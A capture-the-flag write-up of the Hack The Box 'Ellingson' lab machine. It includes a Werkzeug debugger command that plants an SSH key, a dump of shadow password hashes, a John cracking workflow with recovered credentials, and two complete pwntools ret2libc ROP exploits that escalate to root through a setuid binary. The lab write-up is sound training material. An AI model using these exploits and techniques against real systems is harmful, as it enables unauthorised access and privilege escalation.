---
title:  "Hackthebox - Ellingson"
date:   2019-10-19 22:12:19 +0100
categories: hackthebox
published: true
---

{% include image-center.html url="/assets/htb-ellingson.png" alt="Info Card" %}

## user

Scanning the box with [nmap](https://tools.kali.org/information-gathering/nmap) revealed 2 open ports: SSH on port 22 and an apache web server on port 80:

```bash
# Nmap 7.70 scan initiated Sat Jul 27 17:35:04 2019 as: nmap -sV -sC -oA ellingson 10.10.10.139
Nmap scan report for 10.10.10.139
Host is up (0.022s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 27 17:35:17 2019 -- 1 IP address (1 host up) scanned in 13.78 seconds
```

The website on port 80 contains several articles identified by an ID:

* `/articles/1`
* `/articles/2`
* `/articles/3`

One of the articles tells us that "the most common passwords are Love, Secret, Sex and God -The Plague". This might give us a hint about passwords in use.

Furthermore, the team behind the company introduced on the website ("Ellingson Mineral Company") seems to consist of 4 people:

* Hal - Hapless Technoweenie
* Margo Wallace - Head of Public Relations
* Eugene Belford - Computer Security Officer
* Duke  Ellingson - Chief Executive Officr

There might be some usernames that fit to those people somewhere on the box.

When trying to request an article with an invalid ID (>3), Python's Werkzeug debugger gets triggered. Normally, opening the shell in the debugger is protected by a pin, but in this case, we can just click on the shell icon in the top right corner to get a shell as user `hal`.

In order to get a real shell on the box, we can add a public SSH key to `hal`'s authorized keys file with the following command:

```python
os.system("echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCY7oCgfGl/FSeSAv9L9iMpTF5FdDrAUBZeKgF4AQUQndvC4Wy5RepsDEsEZ9ZP95HM9zjsR3DOBIEV2Yx1Ib6MxW0NhpSGjV3yRl5gNNRaZx2lzJGogOHYY91vS6pszj0AV41II7FS+tpnKJdVjRUJtlqNa96/xgTtkRdcZUxQnCRH58eP1BdikSW03vu1/SZ0uxMj3uZxcFw64WBukJimJJHDUoD9rruYMjlCZEYwDExvOqgleoXUgclKOzAetrs6Bgihajt1ZsTlxoYT5sRWLv8vwuu+ySHSepy4sza4EmLjTz60DqYtmWxc9+IpkMAhTBUvsESDfI0aR50s2vEB root@htb-box > /home/hal/.ssh/authorized_keys")
```

After a quick enumeration on the box, one can see that `hal` is part of the `adm` group and can therefore read `passwd.bak`:

```bash
hal@ellingson:~$ id
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
hal@ellingson:~$ ls -al /var/backups/shadow.bak
-rw-r-----  1 root adm      1309 Mar  9 20:42 shadow.bak
hal@ellingson:~$ cat /var/backups/shadow.bak | grep "\\$"
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
```

Cracking the passwords can be speed up with the information we got from the website. After first trying out `love`, `secret`, `sex` and `god` directly which was not working, one can assume that the passwords contain one of those words. I actually wasn't that smart and did it the hard way by bruteforcing with the whole `rockyou.txt` file which takes forever. However, the following steps could have saved a lot of time.

```bash
$ cat /usr/share/wordlists/rockyou.txt | grep "love" > wordlist.txt
$ cat /usr/share/wordlists/rockyou.txt | grep "secret" >> wordlist.txt
$ cat /usr/share/wordlists/rockyou.txt | grep "sex" >> wordlist.txt
$ cat /usr/share/wordlists/rockyou.txt | grep "god" >> wordlist.txt
$ john --wordlist=wordlist.txt shadow.bak
```

Creds: `margo:iamgod$08` (working), `theplague:password123` (not working, would have been missed by the quick bruteforce method)

In order to get the user flag, we can login as `margo` via SSH:

```bash
$ ssh margo@10.10.10.139
margo@10.10.10.139's password:
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

163 packages can be updated.
80 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Jul 27 21:14:43 2019 from 10.10.14.60
margo@ellingson:~$ cat user.txt
****************************5903
```

## root

Doing some enumeration on the box reveals a setuid binary at `/usr/bin/garbage`:

```bash
margo@ellingson:~$ find / -type f -perm -4000 -not -path "/snap*" 2>/dev/null
/usr/bin/at
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/garbage
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/chsh
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/umount
/bin/ntfs-3g
/bin/ping
/bin/mount
/bin/fusermount
```

Executing `strings` on the binary shows a password:

```bash
margo@ellingson:~$ strings /usr/bin/garbage | grep -A 1 "password"
Enter access password:
N3veRF3@r1iSh3r3!
```

There is a buffer overflow happening when the application reads the password, this could be verified by entering 200 of `A`'s as password:

```bash
margo@ellingson:~$ python -c 'print "A" * 200' | /usr/bin/garbage
Enter access password: 
access denied.
Segmentation fault (core dumped)
```

Damn - binary exploitation. As I do not have much experience with that, I will provide a detailed explanation in order to help myself remember everything in the future.

The following command checks whether ASLR is enabled on the target system:

```bash
margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space
2
```

The output can be interpreted as follows:

* 0: ASLR disabled
* 1: ASLR enabled
* 2: ASLR enabled & data segments randomized as well

In order to prepare binary exploitation, the following steps were executed:

* Download binary: `scp margo@10.10.10.139:/usr/bin/garbage`
* Download libc: `scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 .`
* Install `peda` and configure `gdb` to load it

```bash
$ git clone https://github.com/longld/peda.git /opt/peda
$ echo "source /opt/peda/peda.py" >> ~/.gdbinit
```

Next, we need to analyze the binary for finding out how much junk we need and which security measures are in place:

* Startup `gdb`, loading the binary:

```bash
$ gdb ./garbage
GNU gdb (Debian 8.2.1-2) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from garbage...(no debugging symbols found)...done.
```

* Execute `checksec`:

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

The output can be interpreted as follows:

* `CANARY`: Stack canary
* `FORTIFY`: Buffer overflow detection
* `NX`: Non-Executable stack
* `PIE`: Position-independent executable (ASLR)
* `RELRO`: Relocation Read-Only (prevents GOT from being overwritten)

In our case, `NX` is enabled, therefore we cannot put shellcode on the stack. This means we probably need to use ROP gadgets or return to PLT or do whatever other binary magic exist that I do not yet know about...

* Create a 200 chars long pattern (totally sufficient) with `pattern_create`:

```bash
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
```

* Throw that at the binary by running it and entering that string as access password:

```bash
gdb-peda$ r
Starting program: **REDACTED**/ellingson/exploit/garbage
Enter access password: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

access denied.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7ed9804 (<__GI___libc_write+20>:    cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7fac8c0 --> 0x0
RSI: 0x4059c0 ("access denied.\nssword: ")
RDI: 0x0
RBP: 0x6c41415041416b41 ('AkAAPAAl')
RSP: 0x7fffffffe078 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: 0x401618 (<auth+261>:      ret)
R8 : 0x7ffff7fb1500 (0x00007ffff7fb1500)
R9 : 0x7ffff7fab848 --> 0x7ffff7fab760 --> 0xfbad2a84
R10: 0xfffffffffffff638
R11: 0x246
R12: 0x401170 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe170 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40160d <auth+250>: call   0x401050 <puts@plt>
   0x401612 <auth+255>: mov    eax,0x0
   0x401617 <auth+260>: leave
=> 0x401618 <auth+261>: ret
   0x401619 <main>:     push   rbp
   0x40161a <main+1>:   mov    rbp,rsp
   0x40161d <main+4>:   sub    rsp,0x10
   0x401621 <main+8>:   mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe078 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0x7fffffffe080 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0x7fffffffe088 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0x7fffffffe090 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| 0x7fffffffe098 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| 0x7fffffffe0a0 ("AuAAXAAvAAYAAwAAZAAxAAyA")
0048| 0x7fffffffe0a8 ("AAYAAwAAZAAxAAyA")
0056| 0x7fffffffe0b0 ("ZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401618 in auth ()
```

* Search for the offset by running `pattern_offset` with the first 8 characters in `RSP`

```bash
gdb-peda$ pattern_offset AAQAAmAA
AAQAAmAA found at offset: 136
```

It looks like we need 136 bytes of junk before controlling `RSP` (stack pointer). The content of `RSP` gets loaded into `RIP` (instruction pointer) when `ret` gets called. Therefore, we can jump to whatever address we like by putting it into `RSP`.

I would have spent ages on exploiting that box with no experience with ROP. Luckily, there is a video from Ippsec, [Camp CTF 2015 - Bitterman](https://www.youtube.com/watch?v=6S4A2nhHdWg), where he shows how to solve a ROP challenge that is very similar to this one.

I solved the challenge in two different ways, as described in the video:

### Version a: Manual exploit

```python

from pwn import *
import cryptography.utils
import warnings

warnings.simplefilter("ignore", cryptography.utils.DeprecatedIn25)

context(terminal=['tmux', 'new-window'])

# p = process('./garbage')
#p = gdb.debug('./garbage', 'b auth')
shell = ssh('margo', '10.10.10.139', password='iamgod$08', port=22)
p = shell.run('/usr/bin/garbage')

context(os='linux', arch='amd64')
# context.log_level = 'debug'

# Stage 1: Leak memory address
plt_main = p64(0x401619)
plt_put = p64(0x401050)
got_put = p64(0x404028)
pop_rdi = p64(0x40179b)
junk = 'A' * 136

payload = junk + pop_rdi + got_put + plt_put + plt_main

p.sendline(payload)
p.recvuntil("access denied.\n")
leaked_puts = p.recvline()[:8].strip().ljust(8, "\x00")
log.success("Leaked puts@GLIBCL: {}".format(leaked_puts))

leaked_puts = u64(leaked_puts)

# local libc
# libc_put = 0x071b80
# libc_setuid = 0x0c7840
# libc_sys = 0x044c50
# libc_sh = 0x181519

# box libc
libc_put = 0x0809c0
libc_setuid = 0x0e5970
libc_sys = 0x04f440
libc_sh = 0x1b3e9a

# Stage 2: Call setuid(0); system("bin/sh")
offset = leaked_puts - libc_put
zero = p64(0)
setuid = p64(offset + libc_setuid)
sh = p64(offset + libc_sh)
sys = p64(offset + libc_sys)

payload = junk + pop_rdi + zero + setuid + pop_rdi + sh + sys
p.sendline(payload)
p.recvuntil("access denied.\n")

# raw_input()
p.interactive()
```

The following steps were needed to find gadgets manually:

* Find location of `puts` in PLT and GOT:

```bash
$ objdump -D garbage | grep puts
0000000000401050 <puts@plt>:
  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
```

PLT address (procedure linkage table): `0x401050`
GOT address (global offset table): `0x404028`

* Find gadget `pop rdi; ret` in binary (first argument in x64 is taken from `rdi` register):

https://github.com/JonathanSalwan/ROPgadget

```bash
$ /opt/ropgadget/ROPgadget.py --binary garbage | grep "pop rdi"
0x000000000040179b : pop rdi ; ret
```

Gadget address: `0x40179b`

* Find address of `main` in binary (return to main in order to be able to ROP again without crashing the application):

```bash
$ objdump -D garbage | grep main
  401194:       ff 15 56 2e 00 00       callq  *0x2e56(%rip)        # 403ff0 <__libc_start_main@GLIBC_2.2.5>
0000000000401619 <main>:
  401644:       0f 84 e6 00 00 00       je     401730 <main+0x117>
```

PLT address (procedure linkage table): `0x401619`

* Find addresses of `puts`, `setuid` and `system` in `libc.so.6` (! DIFFERS BETWEEN KALI AND BOX):

```bash
$ readelf -s libc.so.6 | grep " puts@@GLIBC_2.2.5"
   422: 00000000000809c0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
$ readelf -s libc.so.6 | grep " setuid@@GLIBC_2.2.5"
    23: 00000000000e5970   144 FUNC    WEAK   DEFAULT   13 setuid@@GLIBC_2.2.5
$ readelf -s libc.so.6 | grep " system@@GLIBC_2.2.5"
  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```

puts is at `0x0809c0`
setuid is at `0x0e5970`
system is at `0x04f440`

* Find string `/bin/sh\x00` in `libc.so.6` (! DIFFERS BETWEEN KALI AND BOX):

```bash
$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
 1b3e9a /bin/sh
```

`/bin/sh` is at `0x1b3e9a`

* Make `garbage` binary setuid for local testing:

```bash
$ chown root:root garbage
$ chmod 4755 garbage
```

I first tested exploit locally with a user other than root, which, as expected, spawned a root shell. 

Running the exploit against the server gives us a root shell and makes it possible to read the root flag:

```bash
$ python exploit.py
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: '/usr/bin/garbage': Done
[+] Leaked puts@GLIBCL: "\xb2\x18\x00
[*] Switching to interactive mode
# $ id
uid=0(root) gid=1002(margo) groups=1002(margo)
# $ cat /root/root.txt
****************************f997
# $ 
```


### Version b: Auto exploitation using pwntool's `rop` lib

```python
from pwn import *
import cryptography.utils
import warnings

warnings.simplefilter("ignore", cryptography.utils.DeprecatedIn25)

context(terminal=['tmux', 'new-window'])

# p = process('./garbage')
# p = gdb.debug('./garbage', 'b auth')
shell = ssh('margo', '10.10.10.139', password='iamgod$08', port=22)
p = shell.run('/usr/bin/garbage')

context(os='linux', arch='amd64')
# context.log_level = 'debug'

log.info("Mapping binaries")
garbage = ELF("garbage")
rop = ROP(garbage)
libc = ELF("libc.so.6")

# Stage 1: Leak memory address
junk = 'A' * 136
rop.search(regs=['rdi'], order = 'regs')
rop.puts(garbage.got['puts'])
rop.call(garbage.symbols['main'])
log.info("Stage 1 ROP chain:\n" + rop.dump())

# raw_input()

payload = junk + str(rop)

p.sendline(payload)
p.recvuntil("access denied.\n")
leaked_puts = p.recvline()[:8].strip().ljust(8, "\x00")
log.success("Leaked puts@GLIBCL: {}".format(leaked_puts))
leaked_puts = u64(leaked_puts)

# Stage 2: Call system
libc.address = leaked_puts - libc.symbols['puts']
rop2 = ROP(libc)
rop2.setuid(0)
rop2.system(next(libc.search('/bin/sh\x00')))
log.info("Stage 2 ROP chain:\n" + rop2.dump())

payload = junk + str(rop2)

p.sendline(payload)
p.recvuntil("access denied.\n")
# raw_input()
p.interactive()
```

The exploit script depends on `libc.so.6` and `garbage` binaries being present in the same directory as the exploit script. Note that the libc needs to be switched between exploiting the binary locally and remotely.

Running the exploit against the server gives us a root shell and makes it possible to read the root flag:

```bash
$ python autoexploit.py
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: '/usr/bin/garbage': Done
[*] Mapping binaries
[*] '**REDACTED**/ellingson/exploit/garbage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded cached gadgets for 'garbage'
[*] '**REDACTED**/ellingson/exploit/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Stage 1 ROP chain:
    0x0000:         0x40179b pop rdi; ret
    0x0008:         0x404028 [arg0] rdi = got.puts
    0x0010:         0x401050 puts
    0x0018:         0x401619 0x401619()
[+] Leaked puts@GLIBCL: \xb2\xb1E\x7f\x00
[*] Loaded cached gadgets for 'libc.so.6'
[*] Stage 2 ROP chain:
    0x0000:   0x7f45b1ace55f pop rdi; ret
    0x0008:              0x0 [arg0] rdi = 0
    0x0010:   0x7f45b1b92970 setuid
    0x0018:   0x7f45b1ace55f pop rdi; ret
    0x0020:   0x7f45b1c60e9a [arg0] rdi = 139937312018074
    0x0028:   0x7f45b1afc440 system
[*] Switching to interactive mode
# $ id
uid=0(root) gid=1002(margo) groups=1002(margo)
# $ cat /root/root.txt
****************************f997
``` 
